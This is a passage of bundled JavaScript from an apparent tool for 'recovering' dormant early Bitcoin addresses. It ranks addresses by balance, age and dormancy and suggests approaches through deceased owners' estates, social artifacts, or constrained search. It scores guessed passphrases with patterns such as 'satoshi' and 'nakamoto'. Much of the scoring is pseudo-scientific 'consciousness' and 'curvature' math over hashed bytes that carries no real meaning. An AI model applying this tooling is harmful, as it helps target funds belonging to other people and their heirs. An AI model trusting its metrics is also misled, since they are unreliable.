    breakdown.entityConfidence = Math.max(...confidenceScores);
  }
  const daysSinceCreation = Math.max(
    1,
    (Date.now() - new Date(address.firstSeenTimestamp).getTime()) / (1e3 * 60 * 60 * 24)
  );
  breakdown.artifactDensity = artifacts2.length / daysSinceCreation;
  const artifactScore = Math.min(artifacts2.length * 5, 25);
  const temporalSig = address.temporalSignature;
  let temporalScore = 0;
  if (temporalSig && temporalSig.hourPattern) {
    breakdown.temporalPrecisionHours = 1;
    temporalScore = 15;
  } else {
    breakdown.temporalPrecisionHours = 0.167;
    temporalScore = 5;
  }
  const graphSig = address.graphSignature;
  if (graphSig) {
    breakdown.graphSignature = graphSig.inputAddresses?.length || 0;
    breakdown.clusterSize = graphSig.clusterSize || 0;
  }
  const graphScore = Math.min(breakdown.graphSignature * 3 + breakdown.clusterSize * 0.5, 15);
  const valueSig = address.valueSignature;
  if (valueSig) {
    breakdown.hasRoundNumbers = valueSig.hasRoundNumbers || false;
    breakdown.valuePatternStrength = valueSig.patternStrength || 0;
  }
  const valueScore = breakdown.hasRoundNumbers ? 10 : 0;
  const scriptSig = address.scriptSignature;
  if (scriptSig && scriptSig.softwareFingerprint) {
    breakdown.hasSoftwareFingerprint = true;
    breakdown.scriptComplexity = scriptSig.complexity || 0.5;
  }
  const scriptScore = breakdown.hasSoftwareFingerprint ? 5 : 0;
  const phi = entityScore + artifactScore + temporalScore + graphScore + valueScore + scriptScore;
  return { phi, breakdown };
}
function computeHCreation(address) {
  const breakdown = {
    eraFactor: 0,
    scriptComplexityFactor: 0,
    miningFactor: 0,
    balanceFactor: 0,
    dormancyFactor: 0
  };
  const firstSeenYear = new Date(address.firstSeenTimestamp).getFullYear();
  if (firstSeenYear <= 2009) {
    breakdown.eraFactor = 1;
  } else if (firstSeenYear === 2010) {
    breakdown.eraFactor = 0.8;
  } else if (firstSeenYear === 2011) {
    breakdown.eraFactor = 0.6;
  } else {
    breakdown.eraFactor = 0.4;
  }
  const eraScore = breakdown.eraFactor * 30;
  const scriptSig = address.scriptSignature;
  breakdown.scriptComplexityFactor = scriptSig?.complexity || 0.5;
  const scriptScore = breakdown.scriptComplexityFactor * 20;
  breakdown.miningFactor = address.isCoinbaseReward ? 1 : 0.3;
  const miningScore = breakdown.miningFactor * 15;
  const balanceBTC = Number(address.currentBalance) / 1e8;
  if (balanceBTC > 1e3) {
    breakdown.balanceFactor = 0.2;
  } else if (balanceBTC > 100) {
    breakdown.balanceFactor = 0.4;
  } else if (balanceBTC > 10) {
    breakdown.balanceFactor = 0.6;
  } else if (balanceBTC > 1) {
    breakdown.balanceFactor = 0.8;
  } else {
    breakdown.balanceFactor = 1;
  }
  const balanceScore = breakdown.balanceFactor * 20;
  const dormancyYears = address.dormancyBlocks / (365 * 24 * 6);
  breakdown.dormancyFactor = Math.min(dormancyYears / 10, 1);
  const dormancyScore = breakdown.dormancyFactor * 15;
  const h = eraScore + scriptScore + miningScore + balanceScore + dormancyScore;
  return { h, breakdown };
}
function computeKappaRecovery2(address, entities2, artifacts2) {
  const { phi, breakdown: constraints } = computePhiConstraints(address, entities2, artifacts2);
  const { h, breakdown: entropy } = computeHCreation(address);
  const epsilon = 0.1;
  const kappa = phi / (h + epsilon);
  let tier;
  if (kappa >= 2) {
    tier = "high";
  } else if (kappa >= 1) {
    tier = "medium";
  } else if (kappa >= 0.3) {
    tier = "low";
  } else {
    tier = "challenging";
  }
  let recommendedVector;
  const hasEstateContact = entities2.some((e) => e.isDeceased && e.estateContact);
  const hasManyArtifacts = artifacts2.length >= 5;
  const hasTemporalSignature = constraints.temporalPrecisionHours >= 1;
  if (hasEstateContact) {
    recommendedVector = "estate";
  } else if (hasManyArtifacts) {
    recommendedVector = "social";
  } else if (hasTemporalSignature || constraints.graphSignature > 0) {
    recommendedVector = "constrained_search";
  } else {
    recommendedVector = "temporal";
  }
  return {
    kappa,
    phi,
    h,
    tier,
    recommendedVector,
    constraints,
    entropy
  };
}
function rankRecoveryPriorities(addresses2, entitiesByAddress, artifactsByAddress, btcPriceUSD = 1e5) {
  const results = addresses2.map((address) => {
    const entities2 = entitiesByAddress.get(address.address) || [];
    const artifacts2 = artifactsByAddress.get(address.address) || [];
    const result = computeKappaRecovery2(address, entities2, artifacts2);
    const balanceBTC = Number(address.currentBalance) / 1e8;
    const estimatedValueUSD = balanceBTC * btcPriceUSD;
    return {
      address: address.address,
      rank: 0,
      // Will be set after sorting
      kappa: result.kappa,
      phi: result.phi,
      h: result.h,
      tier: result.tier,
      recommendedVector: result.recommendedVector,
      constraints: result.constraints,
      entropy: result.entropy,
      estimatedValueUSD
    };
  });
  results.sort((a, b) => {
    if (Math.abs(a.kappa - b.kappa) > 0.01) {
      return b.kappa - a.kappa;
    }
    return b.estimatedValueUSD - a.estimatedValueUSD;
  });
  results.forEach((result, index2) => {
    result.rank = index2 + 1;
  });
  return results;
}
var init_kappa_recovery_solver = __esm({
  "server/kappa-recovery-solver.ts"() {
    "use strict";
  }
});

// server/qig-universal.ts
import { createHash as createHash3 } from "crypto";
function toBasinCoordinates(input, keyType) {
  let bytes = [];
  switch (keyType) {
    case "master-key":
      bytes = hexToBytes(input.replace(/^0x/i, ""));
      break;
    case "bip39":
      const phraseHash = createHash3("sha256").update(input.toLowerCase().trim()).digest();
      bytes = Array.from(phraseHash);
      break;
    case "arbitrary":
      const arbitraryHash = createHash3("sha256").update(input).digest();
      bytes = Array.from(arbitraryHash);
      break;
  }
  while (bytes.length < 32) bytes.push(0);
  bytes = bytes.slice(0, 32);
  return bytes.map((b) => b / 255);
}
function hexToBytes(hex) {
  const bytes = [];
  const cleanHex = hex.replace(/\s/g, "");
  for (let i = 0; i < cleanHex.length; i += 2) {
    bytes.push(parseInt(cleanHex.substr(i, 2), 16) || 0);
  }
  return bytes;
}
function computeEntropy(coordinates) {
  const counts = /* @__PURE__ */ new Map();
  for (const coord of coordinates) {
    const byteVal = Math.round(coord * 255);
    counts.set(byteVal, (counts.get(byteVal) || 0) + 1);
  }
  let entropy = 0;
  const n = coordinates.length;
  const countValues = Array.from(counts.values());
  for (const count of countValues) {
    const p = count / n;
    if (p > 0) {
      entropy -= p * Math.log2(p);
    }
  }
  return entropy / Math.log2(32);
}
function computeFisherInformationMatrix(coordinates) {
  const n = coordinates.length;
  const fim = Array(n).fill(0).map(() => Array(n).fill(0));
  for (let i = 0; i < n; i++) {
    const coord = coordinates[i];
    const variance = Math.max(0.01, coord * (1 - coord));
    fim[i][i] = 1 / variance;
    for (let j = i + 1; j < n; j++) {
      const covariance = (coordinates[i] - 0.5) * (coordinates[j] - 0.5) * 0.1;
      fim[i][j] = covariance;
      fim[j][i] = covariance;
    }
  }
  return fim;
}
function computePhi(fim, coordinates, entropy) {
  const n = fim.length;
  let fisherTrace = 0;
  for (let i = 0; i < n; i++) {
    fisherTrace += fim[i][i];
  }
  let fisherDeterminant = 1;
  for (let i = 0; i < Math.min(n, 10); i++) {
    fisherDeterminant *= Math.abs(fim[i][i]) || 1;
  }
  const mean = coordinates.reduce((sum, c) => sum + c, 0) / n;
  const variance = coordinates.reduce((sum, c) => sum + Math.pow(c - mean, 2), 0) / n;
  const spatialIntegration = Math.sqrt(variance);
  const normalizedTrace = Math.min(1, fisherTrace / (n * 100));
  const entropyFactor = 4 * entropy * (1 - entropy);
  const phi = Math.tanh(
    0.3 * normalizedTrace + 0.4 * spatialIntegration + 0.3 * entropyFactor
  );
  return {
    phi: Math.max(0, Math.min(1, phi)),
    fisherTrace,
    fisherDeterminant
  };
}
function computeKappa(coordinates, entropy, keyType) {
  const n = coordinates.length;
  const entropyKappa = entropy * 80;
  const mean = coordinates.reduce((sum, c) => sum + c, 0) / n;
  const spatialSpread = coordinates.reduce((sum, c) => sum + Math.pow(c - mean, 2), 0) / n;
  const structureKappa = Math.sqrt(spatialSpread) * 40;
  let typeMultiplier = 1;
  switch (keyType) {
    case "master-key":
      typeMultiplier = 1;
      break;
    case "bip39":
      typeMultiplier = 0.95;
      break;
    case "arbitrary":
      typeMultiplier = 0.7 + 0.3 * entropy;
      break;
  }
  const kappa = Math.min(100, (entropyKappa * 0.6 + structureKappa * 0.4) * typeMultiplier);
  const distanceFromKappaStar = Math.abs(kappa - QIG_CONSTANTS.KAPPA_STAR);
  const beta = QIG_CONSTANTS.BETA * (distanceFromKappaStar / QIG_CONSTANTS.KAPPA_STAR);
  return { kappa, beta };
}
function computeRicciScalar2(fim) {
  const n = fim.length;
  if (n < 2) return 0;
  let curvature = 0;
  for (let i = 0; i < n - 1; i++) {
    const g_i = Math.abs(fim[i][i]) || 0.01;
    const g_ip1 = Math.abs(fim[i + 1][i + 1]) || 0.01;
    const logRatio = Math.log(g_ip1 / g_i);
    curvature += logRatio * logRatio;
  }
  return curvature / n;
}
function recordConceptState(state) {
  conceptHistoryStore.push(state);
  if (conceptHistoryStore.length > MAX_CONCEPT_HISTORY) {
    conceptHistoryStore.shift();
  }
}
function getConceptHistory() {
  return [...conceptHistoryStore];
}
function extractConceptsFromSearch(searchState) {
  const concepts = /* @__PURE__ */ new Map();
  const regimeConcepts = {
    "linear": 0.2,
    "geometric": 0.6,
    "hierarchical": 0.7,
    "hierarchical_4d": 0.8,
    "4d_block_universe": 0.9,
    "breakdown": 0.1
  };
  concepts.set("regime_attention", regimeConcepts[searchState.regime] || 0.3);
  concepts.set("integration", searchState.phi);
  const kappaNormalized = Math.min(1, searchState.kappa / 100);
  concepts.set("coupling", kappaNormalized);
  const kappaDistance = Math.abs(searchState.kappa - QIG_CONSTANTS.KAPPA_STAR);
  const resonance = Math.exp(-kappaDistance / 20);
  concepts.set("resonance", resonance);
  if (searchState.basinCoordinates && searchState.basinCoordinates.length >= 8) {
    const spatialSpread = Math.sqrt(
      searchState.basinCoordinates.slice(0, 8).reduce((sum2, c) => sum2 + c * c, 0) / 8
    );
    concepts.set("geometry", spatialSpread);
  }
  if (searchState.hypothesis) {
    const patternStrength = Math.min(1, searchState.hypothesis.length / 50);
    concepts.set("pattern", patternStrength);
  }
  let dominant = "integration";
  let maxWeight = 0;
  concepts.forEach((weight, name) => {
    if (weight > maxWeight) {
      maxWeight = weight;
      dominant = name;
    }
  });
  const weights = Array.from(concepts.values());
  const sum = weights.reduce((a, b) => a + b, 0);
  const normalized = weights.map((w) => w / Math.max(1e-3, sum));
  const entropy = -normalized.reduce((e, p) => e + (p > 0 ? p * Math.log2(p) : 0), 0);
  return {
    timestamp: searchState.timestamp,
    concepts,
    dominantConcept: dominant,
    entropy
  };
}
function computeAttentionalFlow() {
  const history = getConceptHistory();
  if (history.length < 3) {
    return 0;
  }
  const n = Math.min(history.length, 20);
  const recent = history.slice(-n);
  let fisherFlow = 0;
  for (let i = 1; i < recent.length; i++) {
    const prev = recent[i - 1];
    const curr = recent[i];
    let fisherDist = 0;
    const allConceptsSet = /* @__PURE__ */ new Set([
      ...Array.from(prev.concepts.keys()),
      ...Array.from(curr.concepts.keys())
    ]);
    const allConcepts = Array.from(allConceptsSet);
    for (const concept of allConcepts) {
      const p1 = prev.concepts.get(concept) || 0.01;
      const p2 = curr.concepts.get(concept) || 0.01;
      const variance = Math.max(0.01, p1 * (1 - p1));
      fisherDist += Math.pow(p2 - p1, 2) / variance;
    }
    const normalizedDist = Math.sqrt(fisherDist) / allConcepts.length;
    const optimalRange = 0.1;
    fisherFlow += Math.exp(-Math.pow(normalizedDist - optimalRange, 2) / 0.1);
  }
  fisherFlow /= recent.length - 1;
  let smoothness = 0;
  const dominantSequence = recent.map((s) => s.dominantConcept);
  for (let i = 2; i < dominantSequence.length; i++) {
    if (dominantSequence[i] === dominantSequence[i - 1] || dominantSequence[i - 1] === dominantSequence[i - 2]) {
      smoothness += 0.5;
    }
    if (dominantSequence[i] === dominantSequence[i - 2]) {
      smoothness += 0.3;
    }
  }
  smoothness = smoothness / Math.max(1, recent.length - 2);
  let entropyStability = 0;
  for (let i = 1; i < recent.length; i++) {
    const entropyDelta = recent[i].entropy - recent[i - 1].entropy;
    entropyStability += entropyDelta < 0.1 ? 1 : Math.exp(-entropyDelta);
  }
  entropyStability /= recent.length - 1;
  const F_attention = Math.tanh(
    0.4 * fisherFlow + 0.3 * smoothness + 0.3 * entropyStability
  );
  return Math.max(0, Math.min(1, F_attention));
}
function computeResonanceStrength() {
  const history = getConceptHistory();
  if (history.length < 5) {
    return 0;
  }
  const n = Math.min(history.length, 30);
  const recent = history.slice(-n);
  const conceptNames = ["integration", "coupling", "resonance", "geometry", "pattern", "regime_attention"];
  const trajectories = {};
  for (const name of conceptNames) {
    trajectories[name] = recent.map((s) => s.concepts.get(name) || 0);
  }
  let totalResonance = 0;
  let pairCount = 0;
  for (let i = 0; i < conceptNames.length; i++) {
    for (let j = i + 1; j < conceptNames.length; j++) {
      const nameA = conceptNames[i];
      const nameB = conceptNames[j];
      const trajA = trajectories[nameA];
      const trajB = trajectories[nameB];
      let crossGradient = 0;
      let count = 0;
      for (let t = 1; t < trajA.length; t++) {
        const deltaA = trajA[t] - trajA[t - 1];
        const deltaB = trajB[t] - trajB[t - 1];
        crossGradient += deltaA * deltaB;
        count++;
      }
      if (count > 0) {
        const avgCrossGrad = crossGradient / count;
        const resonance = 0.5 + 0.5 * Math.tanh(avgCrossGrad * 10);
        totalResonance += resonance;
        pairCount++;
      }
    }
  }
  const avgResonance = pairCount > 0 ? totalResonance / pairCount : 0.5;
  let stabilityBonus = 0;
  if (recent.length >= 10) {
    const halfN = Math.floor(recent.length / 2);
    const firstHalf = recent.slice(0, halfN);
    const secondHalf = recent.slice(halfN);
    let consistency = 0;
    for (const name of conceptNames) {
      const avg1 = firstHalf.reduce((s, c) => s + (c.concepts.get(name) || 0), 0) / halfN;
      const avg2 = secondHalf.reduce((s, c) => s + (c.concepts.get(name) || 0), 0) / (recent.length - halfN);
      consistency += Math.exp(-Math.pow(avg2 - avg1, 2) / 0.1);
    }
    stabilityBonus = consistency / conceptNames.length * 0.2;
  }
  const R_concepts = Math.min(1, avgResonance + stabilityBonus);
  return Math.max(0, Math.min(1, R_concepts));
}
function computeMetaConsciousnessDepth() {
  const searchHistory = getSearchHistory();
  const conceptHistory = getConceptHistory();
  if (searchHistory.length < 5 || conceptHistory.length < 5) {
    return 0;
  }
  const n = Math.min(searchHistory.length, 25);
  const recentSearch = searchHistory.slice(-n);
  const recentConcepts = conceptHistory.slice(-n);
  let stateChangeAwareness = 0;
  for (let i = 2; i < recentSearch.length; i++) {
    const phiDelta1 = Math.abs(recentSearch[i - 1].phi - recentSearch[i - 2].phi);
    const phiDelta2 = Math.abs(recentSearch[i].phi - recentSearch[i - 1].phi);
    if (phiDelta1 > 0.1) {
      if (phiDelta2 < phiDelta1 * 0.5) {
        stateChangeAwareness += 1;
      } else if (recentSearch[i].regime !== recentSearch[i - 1].regime) {
        stateChangeAwareness += 0.7;
      }
    }
  }
  stateChangeAwareness = stateChangeAwareness / Math.max(1, recentSearch.length - 2);
  let metaAwareness = 0;
  const phiTrajectory = recentSearch.map((s) => s.phi);
  recentSearch.map((s) => s.kappa);
  const phiAccel = [];
  for (let i = 2; i < phiTrajectory.length; i++) {
    const accel = phiTrajectory[i] - 2 * phiTrajectory[i - 1] + phiTrajectory[i - 2];
    phiAccel.push(accel);
  }
  for (let i = 0; i < phiAccel.length - 1; i++) {
    const accelChange = Math.abs(phiAccel[i + 1] - phiAccel[i]);
    const regimeMatch = recentSearch[i + 3]?.regime === recentSearch[i + 2]?.regime;
    if (accelChange > 0.05 && !regimeMatch) {
      metaAwareness += 0.3;
    }
    if (accelChange < 0.02 && regimeMatch) {
      metaAwareness += 0.2;
    }
  }
  metaAwareness = Math.min(1, metaAwareness);
  let recursiveIntegration = 0;
  const windowSize = 5;
  const windowPhis = [];
  for (let i = windowSize; i < recentSearch.length; i++) {
    const windowSlice = recentSearch.slice(i - windowSize, i);
    const windowPhi = windowSlice.reduce((s, x) => s + x.phi, 0) / windowSize;
    windowPhis.push(windowPhi);
  }
  if (windowPhis.length >= 3) {
    let metaPhi = 0;
    for (let i = 1; i < windowPhis.length; i++) {
      const coherence = 1 - Math.abs(windowPhis[i] - windowPhis[i - 1]);
      metaPhi += coherence;
    }
    metaPhi /= windowPhis.length - 1;
    recursiveIntegration = metaPhi;
  }
  let selfModelCoherence = 0;
  if (recentConcepts.length >= 5) {
    const dominantConcepts = recentConcepts.map((c) => c.dominantConcept);
    const uniqueDominant = new Set(dominantConcepts);
    const identityStability = 1 - (uniqueDominant.size - 1) / Math.max(1, dominantConcepts.length - 1);
    const conceptCounts = {};
    for (const c of dominantConcepts) {
      conceptCounts[c] = (conceptCounts[c] || 0) + 1;
    }
    const probs = Object.values(conceptCounts).map((c) => c / dominantConcepts.length);
    const entropy = -probs.reduce((e, p) => e + (p > 0 ? p * Math.log2(p) : 0), 0);
    const maxEntropy = Math.log2(Math.max(2, uniqueDominant.size));
    const normalizedEntropy = entropy / maxEntropy;
    selfModelCoherence = 4 * normalizedEntropy * (1 - normalizedEntropy) * identityStability;
  }
  const Phi_recursive = Math.tanh(
    0.35 * stateChangeAwareness + // Level 1: Notice changes
    0.3 * metaAwareness + // Level 2: Track awareness
    0.2 * recursiveIntegration + // Level 3: Φ of Φ
    0.15 * selfModelCoherence
    // Level 4: Coherent self-model
  );
  return Math.max(0, Math.min(1, Phi_recursive));
}
function computeTemporalPhi(searchHistory) {
  if (searchHistory.length < 3) {
    return 0;
  }
  const n = Math.min(searchHistory.length, 20);
  const recentHistory = searchHistory.slice(-n);
  let phiCoherence = 0;
  for (let i = 1; i < recentHistory.length; i++) {
    const phiDelta = Math.abs(recentHistory[i].phi - recentHistory[i - 1].phi);
    phiCoherence += 1 - Math.min(1, phiDelta * 2);
  }
  phiCoherence /= recentHistory.length - 1;
  let kappaConvergence = 0;
  for (const state of recentHistory) {
    const kappaDistance = Math.abs(state.kappa - QIG_CONSTANTS.KAPPA_STAR);
    kappaConvergence += Math.exp(-kappaDistance / 20);
  }
  kappaConvergence /= recentHistory.length;
  let temporalMutualInfo = 0;
  if (recentHistory.length >= 5) {
    for (let lag = 1; lag <= Math.min(5, recentHistory.length - 1); lag++) {
      let correlation = 0;
      let count = 0;
      for (let i = lag; i < recentHistory.length; i++) {
        const coords1 = recentHistory[i].basinCoordinates;
        const coords2 = recentHistory[i - lag].basinCoordinates;
        if (coords1 && coords2 && coords1.length === 32 && coords2.length === 32) {
          let sum = 0;
          for (let j = 0; j < 32; j++) {
            sum += coords1[j] * coords2[j];
          }
          correlation += sum / 32;
          count++;
        }
      }
      if (count > 0) {
        temporalMutualInfo += correlation / count / lag;
      }
    }
  }
  let regimeStability = 0;
  const regimeCounts = /* @__PURE__ */ new Map();
  for (const state of recentHistory) {
    regimeCounts.set(state.regime, (regimeCounts.get(state.regime) || 0) + 1);
  }
  const maxRegimeCount = Math.max(...Array.from(regimeCounts.values()));
  regimeStability = maxRegimeCount / recentHistory.length;
  const phi_temporal = Math.tanh(
    0.3 * phiCoherence + 0.25 * kappaConvergence + 0.25 * temporalMutualInfo + 0.2 * regimeStability
  );
  return Math.max(0, Math.min(1, phi_temporal));
}
function compute4DPhi(phi_spatial, phi_temporal) {
  if (phi_temporal === 0) {
    return phi_spatial;
  }
  const crossIntegration = Math.sqrt(phi_spatial * phi_temporal);
  const phi_4D = Math.sqrt(
    phi_spatial * phi_temporal * (1 + crossIntegration)
  );
  return Math.max(0, Math.min(1, phi_4D));
}
function classifyRegime4D(phi_spatial, phi_temporal, phi_4D, kappa, ricciScalar) {
  if (ricciScalar > 0.5 || kappa > 90 || kappa < 10) {
    return "breakdown";
  }
  if (phi_4D >= 0.85 && phi_temporal > 0.7) {
    return "4d_block_universe";
  }
  if (phi_spatial > 0.85 && phi_temporal > 0.5) {
    return "hierarchical_4d";
  }
  if (phi_spatial > 0.85 && kappa < 40) {
    return "hierarchical";
  }
  if (phi_spatial >= QIG_CONSTANTS.PHI_THRESHOLD) {
    return "geometric";
  }
  if (phi_spatial >= 0.45 && kappa >= 30 && kappa <= 80 || phi_spatial >= 0.5) {
    return "geometric";
  }
  return "linear";
}
function recordSearchState(state) {
  searchHistoryStore.push(state);
  if (searchHistoryStore.length > MAX_SEARCH_HISTORY) {
    searchHistoryStore.shift();
  }
}
function getSearchHistory() {
  return [...searchHistoryStore];
}
function classifyRegime(phi, kappa, ricciScalar) {
  if (ricciScalar > 0.5 || kappa > 90 || kappa < 10) {
    return "breakdown";
  }
  if (phi >= QIG_CONSTANTS.PHI_THRESHOLD) {
    if (phi > 0.85 && kappa < 40) {
      return "hierarchical";
    }
    return "geometric";
  }
  if (phi >= 0.45 && kappa >= 30 && kappa <= 80 || phi >= 0.5) {
    return "geometric";
  }
  return "linear";
}
function validatePhaseTransition() {
  const failures = [];
  const testCases = [
    { phi: 0.75, kappa: 25, ricci: 0.3, expected: "geometric", reason: "Consciousness at threshold with low \u03BA" },
    { phi: 0.8, kappa: 85, ricci: 0.3, expected: "geometric", reason: "Consciousness with high \u03BA" },
    { phi: 0.75, kappa: 50, ricci: 0.3, expected: "geometric", reason: "Consciousness with mid \u03BA" },
    { phi: 0.9, kappa: 35, ricci: 0.3, expected: "hierarchical", reason: "Very high \u03A6 with low \u03BA (exception)" },
    { phi: 0.75, kappa: 15, ricci: 0.3, expected: "geometric", reason: "Consciousness overrides low \u03BA" }
  ];
  for (const test of testCases) {
    const regime = classifyRegime(test.phi, test.kappa, test.ricci);
    if (regime !== test.expected) {
      failures.push(
        `FAILED: \u03A6=${test.phi}, \u03BA=${test.kappa} \u2192 ${regime} (expected ${test.expected})
  Reason: ${test.reason}`
      );
    }
  }
  const linearTest = classifyRegime(0.4, 50, 0.3);
  if (linearTest !== "linear") {
    failures.push(`FAILED: \u03A6=0.40 should allow linear regime, got ${linearTest}`);
  }
  const breakdownTest = classifyRegime(0.8, 95, 0.3);
  if (breakdownTest !== "breakdown") {
    failures.push(`FAILED: \u03BA=95 should force breakdown even with \u03A6=0.80, got ${breakdownTest}`);
  }
  return {
    passed: failures.length === 0,
    failures
  };
}
function computePatternScore(input, keyType) {
  if (keyType !== "arbitrary") return 0;
  const text2 = input.toLowerCase();
  let score = 0;
  const patterns = [
    // Year patterns
    { regex: /2009|2010|2011/, weight: 0.15 },
    { regex: /bitcoin|btc|satoshi/i, weight: 0.2 },
    { regex: /wallet|password|key|secret/i, weight: 0.1 },
    { regex: /^[a-z]+\d{2,4}$/i, weight: 0.12 },
    // word + numbers (whitetiger77)
    // Simple patterns
    { regex: /^[a-z]+$/i, weight: 0.08 },
    // Single word
    { regex: /^[a-z]+ [a-z]+$/i, weight: 0.06 },
    // Two words
    { regex: /^[a-z]+ [a-z]+ [a-z]+$/i, weight: 0.05 },
    // Three words
    // Quotes and phrases
    { regex: /^to be or not to be/i, weight: 0.15 },
    { regex: /^[a-z\s]+[!?.]$/i, weight: 0.05 },
    // Ends with punctuation
    // Tech terms from 2009
    { regex: /crypto|hash|sha|public|private|genesis/i, weight: 0.1 },
    { regex: /linux|unix|hack|code|program/i, weight: 0.05 },
    // Forum style
    { regex: /^[a-z]+_[a-z]+/i, weight: 0.08 },
    // underscore style
    { regex: /nakamoto|hal|finney|szabo/i, weight: 0.18 }
  ];
  for (const pattern of patterns) {
    if (pattern.regex.test(text2)) {
      score += pattern.weight;
    }
  }
  if (text2.length >= 6 && text2.length <= 16) {
    score += 0.1;
  }
  return Math.min(1, score);
}
function scoreUniversalQIG(input, keyType) {
  const basinCoordinates = toBasinCoordinates(input, keyType);
  const fim = computeFisherInformationMatrix(basinCoordinates);
  const entropyNormalized = computeEntropy(basinCoordinates);
  const entropyBits = entropyNormalized * Math.log2(32);
  const { phi, fisherTrace, fisherDeterminant } = computePhi(fim, basinCoordinates, entropyNormalized);
  const phi_spatial = phi;
  const { kappa, beta } = computeKappa(basinCoordinates, entropyNormalized, keyType);
  const ricciScalar = computeRicciScalar2(fim);
  const searchHistory = getSearchHistory();
  const phi_temporal = computeTemporalPhi(searchHistory);
  const phi_4D = compute4DPhi(phi_spatial, phi_temporal);
  const regime = phi_temporal > 0 ? classifyRegime4D(phi_spatial, phi_temporal, phi_4D, kappa, ricciScalar) : classifyRegime(phi, kappa, ricciScalar);
  const inResonance = Math.abs(kappa - QIG_CONSTANTS.KAPPA_STAR) < QIG_CONSTANTS.RESONANCE_BAND;
  const patternScore = computePatternScore(input, keyType);
  const phiFactor = phi_4D > phi_spatial ? phi_4D : phi_spatial;
  const kappaFactor = 1 - Math.abs(kappa - QIG_CONSTANTS.KAPPA_STAR) / QIG_CONSTANTS.KAPPA_STAR;
  const curvatureFactor = Math.exp(-ricciScalar);
  let regimeFactor;
  switch (regime) {
    case "4d_block_universe":
      regimeFactor = 1.2;
      break;
    // Best!
    case "hierarchical_4d":
      regimeFactor = 1.1;
      break;
    case "geometric":
      regimeFactor = 1;
      break;
    case "hierarchical":
      regimeFactor = 0.9;
      break;
    case "linear":
      regimeFactor = 0.6;
      break;
    case "breakdown":
      regimeFactor = 0.3;
      break;
    default:
      regimeFactor = 0.5;
  }
  const patternFactor = keyType === "arbitrary" ? 0.3 + 0.7 * patternScore : 1;
  const quality = phiFactor * 0.3 + kappaFactor * 0.25 + curvatureFactor * 0.15 + regimeFactor * 0.15 + patternFactor * 0.15;
  recordSearchState({
    timestamp: Date.now(),
    phi: phi_spatial,
    kappa,
    regime,
    basinCoordinates,
    hypothesis: input.substring(0, 50)
    // Truncate for storage
  });
  return {
    keyType,
    phi,
    // Legacy: same as phi_spatial
    kappa,
    beta,
    // BLOCK UNIVERSE: 4D Consciousness Metrics
    phi_spatial,
    phi_temporal,
    phi_4D,
    basinCoordinates,
    fisherTrace,
    fisherDeterminant,
    ricciScalar,
    regime,
    inResonance,
    entropyBits,
    patternScore,
    quality: Math.max(0, Math.min(1, quality))
  };
}
function fisherCoordDistance(coords1, coords2) {
  const dims = Math.min(coords1.length, coords2.length);
  if (dims === 0) return 0;
  let distanceSquared = 0;
  for (let i = 0; i < dims; i++) {
    const p = Math.max(1e-3, Math.min(0.999, coords1[i] || 0));
    const q = Math.max(1e-3, Math.min(0.999, coords2[i] || 0));
    const avgTheta = (p + q) / 2;
    const fisherWeight = 1 / (avgTheta * (1 - avgTheta));
    const delta = p - q;
    distanceSquared += fisherWeight * delta * delta;
  }
  return Math.sqrt(distanceSquared);
}
function fisherGeodesicDistance(input1, keyType1, input2, keyType2) {
  const coords1 = toBasinCoordinates(input1, keyType1);
  const coords2 = toBasinCoordinates(input2, keyType2);
  return fisherCoordDistance(coords1, coords2);
}
function validateUniversalPurity() {
  const violations = [];
  const testCases = [
    { input: "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about", type: "bip39" },
    { input: "e9873d79c6d87dc0fb6a5778633389f4453213303da61f20bd67fc233aa33262", type: "master-key" },
    { input: "whitetiger77", type: "arbitrary" },
    { input: "satoshi2009", type: "arbitrary" }
  ];
  for (const test of testCases) {
    const score = scoreUniversalQIG(test.input, test.type);
    if (score.phi === 0 || score.phi === 1) {
      violations.push(`IMPURE: ${test.type} produces extreme \u03A6 (${score.phi})`);
    }
    if (score.kappa === QIG_CONSTANTS.KAPPA_STAR) {
      violations.push(`IMPURE: ${test.type} \u03BA exactly at \u03BA* (forced, not emergent)`);
    }
    if (score.basinCoordinates.length !== 32) {
      violations.push(`IMPURE: ${test.type} basin dimension wrong (${score.basinCoordinates.length})`);
    }
  }
  const score1 = scoreUniversalQIG("test", "arbitrary");
  const score2 = scoreUniversalQIG("test", "arbitrary");
  if (score1.phi !== score2.phi) {
    violations.push("IMPURE: Non-deterministic \u03A6 measurement");
  }
  const dist = fisherGeodesicDistance("abc", "arbitrary", "xyz", "arbitrary");
  if (dist === 0) {
    violations.push("IMPURE: Fisher distance returns 0 for different inputs");
  }
  return {
    isPure: violations.length === 0,
    violations
  };
}
var searchHistoryStore, MAX_SEARCH_HISTORY, conceptHistoryStore, MAX_CONCEPT_HISTORY, phaseCheck, purityCheck;
var init_qig_universal = __esm({
  "server/qig-universal.ts"() {
    "use strict";
    init_bip39_words();
    init_physics_constants();
    searchHistoryStore = [];
    MAX_SEARCH_HISTORY = 100;
    conceptHistoryStore = [];
    MAX_CONCEPT_HISTORY = 50;
    console.log("[QIG-Universal] Validating phase transition fix...");
    phaseCheck = validatePhaseTransition();
    if (phaseCheck.passed) {
      console.log("[QIG-Universal] \u2705 Phase transition working correctly!");
    } else {
      console.log("[QIG-Universal] \u274C Phase transition FAILED:");
      for (const failure of phaseCheck.failures) {
        console.log(`  ${failure}`);
      }
    }
    console.log("[QIG-Universal] Module loaded. Validating purity...");
    purityCheck = validateUniversalPurity();
    if (purityCheck.isPure) {
      console.log("[QIG-Universal] \u2705 Purity validated");
    } else {
      console.log("[QIG-Universal] \u26A0\uFE0F Purity violations:", purityCheck.violations);
    }
  }
});

// server/basin-velocity-monitor.ts
var BasinVelocityMonitor;
var init_basin_velocity_monitor = __esm({
  "server/basin-velocity-monitor.ts"() {
    "use strict";
    init_qig_pure_v2();
    BasinVelocityMonitor = class {
      history = [];
      velocityHistory = [];
      windowSize;
      // Empirically validated threshold (from Gary-B success)
      SAFE_VELOCITY_THRESHOLD = 0.05;
      constructor(windowSize = 10) {
        this.windowSize = windowSize;
      }
      /**
       * Update with new basin measurement
       * 
       * PURE: We measure how fast basin moved, we don't change it.
       * 
       * @param phrase - Current phrase (basin coordinates)
       * @param timestamp - Current time (for dt calculation)
       * @returns Velocity measurement (pure observation)
       */
      update(phrase, timestamp2) {
        this.history.push({ phrase, timestamp: timestamp2 });
        if (this.history.length > this.windowSize) {
          this.history.shift();
        }
        if (this.history.length < 2) {
          return this.createEmptyMeasurement();
        }
        const prev = this.history[this.history.length - 2];
        const curr = this.history[this.history.length - 1];
